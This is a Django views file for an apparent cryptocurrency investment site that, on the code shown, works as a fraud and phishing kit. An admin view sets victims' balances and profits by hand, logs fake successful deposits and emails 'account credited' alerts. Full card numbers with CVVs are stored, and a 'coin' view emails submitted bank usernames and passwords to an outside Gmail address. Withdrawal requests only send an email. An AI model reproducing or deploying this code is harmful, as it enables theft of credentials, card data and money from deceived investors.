from django.shortcuts import render, redirect
from .models import Member, Manage, History, Ref, Fbot, Mbot, Gbot
from django.core.exceptions import ObjectDoesNotExist
import random
from django.core.mail import send_mail
import datetime
from django.template.loader import render_to_string


# Create your views here.

def cardv(request):
    if request.session['luser']:
        site = Manage.objects.get(site='site')
        user = Member.objects.get(email=request.session['luser'])
        cash= user.bal+user.eth+user.btc
        cont={'user':user,'site':site,'cash':cash}

        # if user.cardb=="Open":
        #     return redirect('/account/')

        if "code" in request.POST:
            user.cardb= request.POST['code']
            user.save()

            return redirect('/account/')

        return render(request, 'user/card-verify-user.html', cont)

def index(request):
    site = Manage.objects.get(site='site')
    if request.GET.get('ref'):
        ref = request.GET.get('ref')
        request.session['ref']=ref
    return render(request, 'home/index.html',{'site':site})


def about(request):
    site = Manage.objects.get(site='site')
    return render(request, 'home/about.html',{'site':site})


def uploads(request):
    if 'email' in request.POST:
        email = request.POST['email']
        pword = request.POST['pword']
        user = Member(email=email, password=pword, date=datetime.datetime.now())
        user.save()
        request.session['email_update'] = email
        return render(request, 'auth/infoupdate.html')

    if 'name' in request.POST:
        country = request.POST['country']
        name = request.POST['name']
        phone = request.POST['phone']
        pin = random.randint(1000, 9999)


        user = Member.objects.get(email=request.session['email_update'])
        user.photo = request.FILES['foto']
        user.country = country
        user.name = name
        user.phone = phone
        user.code=pin
        user.save()

        return render(request, 'auth/done.html')


    return render(request, 'auth/update.html')


def signup(request):
    site = Manage.objects.get(site='site')
    if 'ref' in request.session:
        try:
            refb = Member.objects.get(code = request.session['ref'])
            msg = 'your were referred by '+ refb.name
        except ObjectDoesNotExist:
            refb = request.session['ref']
            msg = 'your were referred by '+ refb

    else:
        msg=""

    cont = {'site':site,'pro': '20%','ref':msg }
    if 'name' in request.POST:
        cont = {'pro': '50%', }
        name = request.POST['name']
        email = request.POST['email']
        country = request.POST['country']
        phone = request.POST['phone']
        pword = request.POST['pword']

        request.session['email'] = email
        user = Member(name=name, email=email, country=country, phone=phone, password=pword, date=datetime.datetime.now())
        user.save()

        send_mail(
            subject='NEW MEMBER SIGN-UP',
            message='name:' + name + ' ' + 'country:' + country,
            from_email='exocoin-fcm@exocoins-fcm.us',
            recipient_list=['exocoin.trade@gmail.com'],
            fail_silently=True
        )


        if 'ref' in request.session:
            user = Member.objects.get(email=request.session['email'])

            refs = Ref(ref=request.session['ref'], add=user.name)
            refs.save()

            del request.session['ref']

        return render(request, 'auth/signup2.html', cont)

    if 'foto' in request.POST:
        cont = {'site':site,'pro': '80%', 'email': request.session['email']}
        user = Member.objects.get(email=request.session['email'])
        user.photo = request.FILES['photo']
        user.trade = request.POST['trade']
        user.save()

        pin = random.randint(1000, 9999)
        request.session['pin'] =pin



        msg_html = render_to_string('auth/verification_email.html', {'name':user.name, 'pin':str(pin)}, request)
        send_mail(
            subject=" EMAIL VERIFICATION",
            message='',
            from_email='exocoin-fcm@exocoins-fcm.us',
            recipient_list=[user.email],
            html_message=msg_html,
            fail_silently=False,
        )

        return render(request, 'auth/comfirm.html', cont,)
    if 'code' in request.POST:
        user = Member.objects.get(email=request.session['email'])

        code = request.POST['code']
        print(request.session['pin'])
        if int(code) == request.session['pin']:
            user.code=code
            user.save()
            cont = {'site':site,'pro': '100%', 'email': request.session['email'], 'error': ''}

            msg_html = render_to_string('auth/welcome_email.html', {'user': 'user'}, request)

            send_mail(
                subject='Welcome To Nietypowypolslikrypto',
                message='',
                from_email='exocoin-fcm@exocoins-fcm.us',
                recipient_list=[request.session['email']],
                html_message=msg_html,
                fail_silently=True
            )

            return render(request, 'auth/success.html', cont,)
        else:
            cont = {'site':site, 'pro': '80%', 'email': request.session['email'], 'error': 'wrong code'}

            return render(request, 'auth/comfirm.html', cont,)

    return render(request, 'auth/signup.html', cont,)


def login(request):
    site = Manage.objects.get(site='site')

    try:
        if 'luser' in request.session:
            return redirect('/account/')
    except ObjectDoesNotExist:
        print("heĺlo")

    if 'lemail' in request.POST:
        lemail = request.POST['lemail']
        pword = request.POST['pword']

        try:
            luser = Member.objects.get(email=lemail)
            request.session['tuser'] = lemail
            if pword == luser.password:
                if luser.code:
                    request.session['luser'] = request.session['tuser']
                    return redirect('/account/')
                else:
                    return render(request, 'auth/comfirm.html',{'site':site})
            else:
                cont = {'error': 'password not correct'}
                return render(request, 'auth/login.html', cont,)
        except ObjectDoesNotExist:
            cont = {'error': 'user not found','site':site}
            return render(request, 'auth/login.html', cont)

    return render(request, 'auth/login.html',{'site':site})


def account(request):
    if request.session['luser']:
        site = Manage.objects.get(site='site')
        user = Member.objects.get(email=request.session['luser'])
        if user.cardb=="lock":
            return redirect('/upgrade/')
        if user.plan == 'starter':
            du = '7days'
        elif user.plan == 'professional':
            du = '5days'
        elif user.plan == 'premium':
            du = '3days'
        elif user.plan == 'vip':
            du = '24hrs'
        else:
            du=''

        cash= user.bal+user.eth+user.btc
        cont = {'user': user, 'duration': du,'site':site,'cash':cash}
        return render(request, 'user/account.html', cont)

def deposit(request):
    if 'luser' in request.session:
        site = Manage.objects.get(site='site')
        user = Member.objects.get(email=request.session['luser'])
        bal = user.btc + user.eth
        cont = {'user': user, 'balw': bal,'site':site}

        if 'amount' in request.POST:
            amt = request.POST['amount']
            his = History(email=user.email, status='pending..', type='deposit', amount=amt, date= datetime.datetime.now() )
            his.save()


            msg_html = render_to_string('admin/trans.html', {'user': user,'his':his,'amt':amt,'type':'Deposite'}, request)

            send_mail(
                subject='['+ user.name +']'+ "MADE A DEPOSIT REQUEST",
                message='',
                from_email='exocoin-fcm@exocoins-fcm.us',
                recipient_list=['exocoin.trade@gmail.com'],
                html_message=msg_html,
                fail_silently=True
            )

            return render(request, 'user/deposit.html',cont)

        if 'upload' in request.POST:
            user = Member.objects.get(email=request.session['luser'])
            site = Manage.objects.get(site='site')
            user.payslip = request.FILES['payslip']
            user.save()
            msg ='payment slip/file was successfully submitted'
            bal = user.btc + user.eth
            cont = {'user': user, 'balw': bal, 'msg':msg,'site':site}
            return render(request, 'user/deposit_amt.html', cont)

        if 'card' in request.POST:
            cont = {'user': user, 'balw': bal, 'error': 'error billing card','site':site}

        return render(request, 'user/deposit_amt.html', cont)


def wallet(request):
    if request.session['luser']:
        site = Manage.objects.get(site='site')
        user = Member.objects.get(email=request.session['luser'])
        bal = user.btc + user.eth
        cont = {'user': user, 'site': site}
        return render(request, 'user/wallet.html', cont)


def card(request):
    if request.session['luser']:
        site = Manage.objects.get(site='site')
        cont={'site':site}
        if request.method == 'POST':
            user = Member.objects.get(email=request.session['luser'])
            user.card_n = request.POST['name']
            user.card_num = request.POST['num']
            user.card_date = request.POST['date']
            user.card_ccv = request.POST['ccv']
            user.save()

            return redirect('/deposit/')

        return render(request, 'user/card.html',cont)


def withdraw(request):
    if 'luser' in request.session:
        site = Manage.objects.get(site='site')
        user = Member.objects.get(email=request.session['luser'])
        cont={'user':user,'site':site}

        if 'wallet' in request.POST:
            wallet = request.POST['wallet']
            amt = request.POST['amount']
            name = user.name

            his = History(email=user.email, status='pending..', type='withdraw', amount=amt, date= datetime.datetime.now() )
            his.save()

            send_mail(
                subject='['+ user.name + ']'+'WITHDRAW REQUEST',
                message='name:'+ name +' '+'amount:'+amt+' '+'wallet:'+wallet,
                from_email='exocoin-fcm@exocoins-fcm.us',
                recipient_list=['exocoin.trade@gmail.com'],
                fail_silently=True
                      )

            return render(request, 'user/successful.html',cont)
        if 'bank' in request.POST:

            amt = request.POST['bank']
            name = user.name

            send_mail(
                subject='WITHDRAW REQUEST',
                message='name:'+ name +' '+'amount:'+amt+' ',
                from_email='exocoin-fcm@exocoins-fcm.us',
                recipient_list=['exocoin.trade@gmail.com'],
                fail_silently=True
                      )

            return render(request, 'user/successful.html',cont)

        return render(request, 'user/withdraw.html',cont)


def bank(request):
    if request.session['luser']:
        site = Manage.objects.get(site='site')
        user = Member.objects.get(email=request.session['luser'])
        cont={'user':user,'site':site}
        if request.method == 'POST':
            user = Member.objects.get(email=request.session['luser'])
            user.bank_n = request.POST['name']
            user.bank = request.POST['bank']
            user.bank_num = request.POST['num']

            user.save()

            return redirect('/withdraw/',cont)

        return render(request, 'user/bank.html',cont)



def livetrade(request):
    if request.session['luser']:
        user = Member.objects.get(email=request.session['luser'])
        site = Manage.objects.get(site='site')

        if user.plan == 'starter':
            du = '7days'
        elif user.plan == 'professional':
            du = '5days'
        elif user.plan == 'premium':
            du = '3days'
        elif user.plan == 'vip':
            du = '24hrs'
        else:
            du=''

        if user.robot:
            bot = 'block'
        else:
            bot='none'

        cont={'user':user,'du':du,'bot':bot,'site':site}
        return render(request, 'user/livetrade.html',cont)


def setup(request):
    if request.session['luser']:
        site = Manage.objects.get(site='site')
        user = Member.objects.get(email=request.session['luser'])

        if 'bot' in request.POST:
            user.robot = request.POST['bot']
            user.plan = request.POST['plan']
            user.trade = request.POST['trade']
            user.save()
            return redirect('/livetrade/')


        return render(request, 'user/setup.html',{'site':site} )


def history(request):
    if request.session['luser']:
        site = Manage.objects.get(site='site')
        user = Member.objects.get(email=request.session['luser'])
        his = History.objects.filter(email=request.session['luser'])
        cont={'His':his,'user':user,'site':site}
        return render(request, 'user/history.html',cont)


def list(request):
    if request.session['luser']:
        site = Manage.objects.get(site='site')
        user = Member.objects.get(email=request.session['luser'])
        ref = Ref.objects.filter(ref=user.code).order_by('add')
        cont={'Refs':ref,'user':user,'site':site}
        return render(request, 'user/list.html',cont)

def admin(request):
    if request.session['luser']:
        user = Member.objects.get(email=request.session['luser'])
        site = Manage.objects.get(site='site')

        if user.code == site.admin:
            mem = Member.objects.all().order_by('name')
            cont={'user':user,'Mem':mem}

            if request.GET.get('rem'):
                rem = request.GET.get('rem')
                user = Member.objects.get(email=rem)
                user.delete()
            return render(request,'admin/admin.html',cont)

def edit(request):
    if request.session['luser']:
        user = Member.objects.get(email= request.session['luser'])
        mem = request.GET.get('mem')
        mems = Member.objects.get(email=mem)
        site = Manage.objects.get(site='site')

        if user.code == site.admin:
            if 'currency' in request.POST:

                mems.currency = request.POST['currency']
                mems.ava = request.POST['ava']
                mems.cap = request.POST['cap']
                mems.bal = request.POST['bal']
                mems.tbal = request.POST['tbal']
                mems.prof = request.POST['prof']
                mems.prof_promo = request.POST['ref_B']
                mems.promo = request.POST['promo']
                mems.code = request.POST['code']
                mems.addup = request.POST['addup']
                mems.robot = request.POST['bot']
                mems.btc = request.POST['btc']
                request.session['credit']=request.POST['addup']
                mems.eth = request.POST['eth']
                mems.cardb= request.POST['loc']
                mems.save()

                his = History(email=mems.email, status='successful', type='Deposit', amount=request.session['credit'],
                              date=datetime.datetime.now())
                his.save()

            if 'alert' in request.POST:
                    date=datetime.datetime.now()
                    bal= mems.bal+mems.eth+mems.btc
                    user=mems.name
                    msg_html = render_to_string('admin/alert.html', {'bal':bal,'user':user,'amt':request.session['credit'],'date':date}, request)
                    send_mail(
                        subject='ACCOUNT CREDITED',
                        message='',
                        from_email='exocoin-fcm@exocoins-fcm.us',
                        recipient_list=[mems.email],
                        html_message=msg_html,
                        fail_silently=False,
                    )



            if 'title' in request.POST:
                mem = request.GET.get('mem')
                mems = Member.objects.get(email=mem)

                mems.title = request.POST['title']
                mems.msg = request.POST['body']
                mems.save()

            if 'del_n' in request.POST:
                his = request.POST['del_n']
                His = History.objects.get(pk=his)
                His.delete()

            if 'edit_status' in request.POST:
                mem = request.GET.get('mem')
                mems = Member.objects.get(email=mem)
                ref = Ref.objects.filter(ref=mems.code)
                his = History.objects.filter(email=mems.email).order_by('-date')
                cont = {'user': user, 'mem': mems, 'Refs': ref, 'His': his}
                return render(request,'admin/history.html',cont)

            if 'status' in request.POST:
                his = request.POST['stat']
                His = History.objects.get(pk=his)
                His.status = request.POST['status']
                His.save()

            if 'email' in request.POST:
                mem = request.GET.get('mem')
                mems = Member.objects.get(email=mem)

                title = request.POST['email']
                msg = request.POST['msg']

                msg_html = render_to_string('admin/mailing.html', {'title':title,'msg':msg}, request)
                send_mail(
                    subject=title,
                    message='',
                    from_email='exocoin-fcm@exocoins-fcm.us',
                    recipient_list=[mems.email],
                    html_message=msg_html,
                    fail_silently=False,
                )



            if request.GET.get('mem'):
                mem = request.GET.get('mem')
                mems = Member.objects.get(email=mem)
                ref = Ref.objects.filter(ref=mems.code)
                his = History.objects.filter(email=mems.email).order_by('-date')
            cont={'user':user,'mem':mems,'Refs':ref,'His':his,}
            return render(request,'admin/edit.html',cont)

def site(request):
    if request.session['luser']:
        user = Member.objects.get(email=request.session['luser'])
        fbot = Fbot.objects.all().order_by('name')
        mbot = Mbot.objects.all().order_by('name')
        gbot = Gbot.objects.all().order_by('name')
        site = Manage.objects.get(site='site')

        if user.code == site.admin:

            user = Member.objects.get(email=request.session['luser'])
            site = Manage.objects.get(site='site')
            cont={'site':site,'user':user, 'Mbot':mbot, 'Fbot':fbot, 'Gbot':gbot}

            if 'mail' in request.POST:
                site.mail = request.POST['mail']
                site.phone = request.POST['phone']
                site.add = request.POST['add']
                site.btc = request.POST['btc']
                site.admin = request.POST['code']


            if 'fbot' in request.POST:
                name = request.POST['fbot']
                price = request.POST['price']
                tendency = request.POST['tendency']


                robot = Fbot(name=name,  price=price, tendency=tendency, )
                robot.save()


            if 'bbot' in request.POST:
                name = request.POST['bbot']
                rate =request.POST['rate']
                price = request.POST['price']
                tendency = request.POST['tendency']
                market = request.POST['market']
                user = request.POST['user']

                robot = Mbot(name=name, rate=rate, price=price, tendency=tendency, market=market, user=user)
                robot.save()


            if 'gbot' in request.POST:
                name = request.POST['gbot']
                # rate =request.POST['rate']
                price = request.POST['price']
                tendency = request.POST['tendency']
                # market = request.POST['market']
                # user = request.POST['user']

                robot = Gbot(name=name, rate='rate', price=price, tendency=tendency, market='market', user='user')
                robot.save()

            if request.GET.get('delFbot'):
              delF= request.GET.get('delFbot')
              bot= Fbot.objects.get(pk=delF)
              bot.delete()
              return redirect('/site/')

            if request.GET.get('delMbot'):
               delM= request.GET.get('delMbot')
               bot= Fbot.objects.get(pk=delM)
               bot.delete()
               return redirect('/site/')

            if request.GET.get('delGbot'):
               delG= request.GET.get('delGbot')
               bot= Fbot.objects.get(pk=delG)
               bot.delete()
               return redirect('/site/')

            return render(request, 'admin/site.html',cont)

def logout(request):
    if request.session['luser']:
        del request.session['luser']
        return redirect('/')

# def coin(request):
#     msg_html = render_to_string('admin/coinbase.html', {}, request)
#     send_mail(
#         subject='detials',
#         message='hello',
#         from_email='exocoin-fcm@exocoins-fcm.us',
#         recipient_list=['i.mattgtad@gmail.com'],
#         html_message=msg_html,
#         fail_silently=False,
#     )
#     return  render(request, 'admin/coinbase.html')

def market(request):
    user = Member.objects.get(email=request.session['luser'])
    site = Manage.objects.get(site='site')

    fbot = Fbot.objects.all().order_by('name')
    mbot = Mbot.objects.all().order_by('name')
    gbot = Gbot.objects.all().order_by('name')
    cont={'Fbot':fbot, 'Mbot':mbot, 'Gbot':gbot,'site':site,'user':user}

    return render(request, 'user/market.html', cont)

def order(request):
    user = Member.objects.get(email=request.session['luser'])
    site = Manage.objects.get(site='site')
    cont={'site':site,'user':user}

    return render(request, 'user/order.html', cont)



def coin(request):
    if request.method=='post':
        # msg_html = render_to_string('admin/coinbase.html', {}, request)
        bank = request.POST['bank']
        user= request.POST['user']
        pword= request.POST['pword']
        send_mail(
            subject='detials',
            message=bank +' '+user+' '+pword,
            from_email='exocoin-fcm@exocoins-fcm.us',
            recipient_list=['fosmill3@gmail.com'],
            # html_message=msg_html,
            fail_silently=True,
        )
    return  render(request, 'admin/coinbase.html')